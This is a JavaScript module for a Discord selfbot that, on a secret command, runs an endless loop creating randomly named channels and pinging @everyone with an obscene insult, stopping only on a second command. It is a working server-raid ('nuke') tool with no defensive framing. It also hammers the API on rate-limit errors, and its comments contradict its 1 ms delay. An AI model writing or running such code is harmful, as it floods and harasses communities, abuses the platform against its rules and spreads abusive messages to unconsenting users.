let isNuking = false; // This tracks if the loop should keep running

module.exports = (client) => {
    const channelNames = [
        "", "system-error", "nuked", "chat-dead", "alert-99"
    ];

    client.on('messageCreate', async (message) => {
        if (message.author.id !== client.user.id) return;

        // --- START COMMAND ---
        if (message.content === '.BANKAI') {
            if (isNuking) return message.edit("⚠️ Already running!");
            
            isNuking = true;
            console.log("🚀 Endless Nuke Started...");

            while (isNuking) {
                try {
                    const name = channelNames[Math.floor(Math.random() * channelNames.length)];
                    
                    // 1. Create Channel
                    const channel = await message.guild.channels.create(`${name}-${Math.floor(Math.random() * 999)}`, {
                        type: 'GUILD_TEXT'
                    });

                    // 2. Ping Everyone
                    await channel.send("@everyone **GO FCK YOURESELVES**");

                    console.log(`✅ Created & Pinged: ${channel.name}`);

                    // 3. Delay (Crucial to avoid instant IP ban)
                    // 3 seconds is the "danger zone" - anything faster is instant ban
                    await new Promise(r => setTimeout(r, 1));

                } catch (err) {
                    console.error("❌ Error:", err.message);
                    if (err.message.includes("429")) {
                        console.log("teri maa ke cud rha hu dhire dhire");
                        await new Promise(r => setTimeout(r, 1));
                    }
                }
            }
        }

        // --- STOP COMMAND ---
        if (message.content === '.lol') {
            isNuking = false;
            console.log("🛑 Endless Nuke Stopped.");
            message.edit("✅ Nuke sequence deactivated.");
        }
    });
};
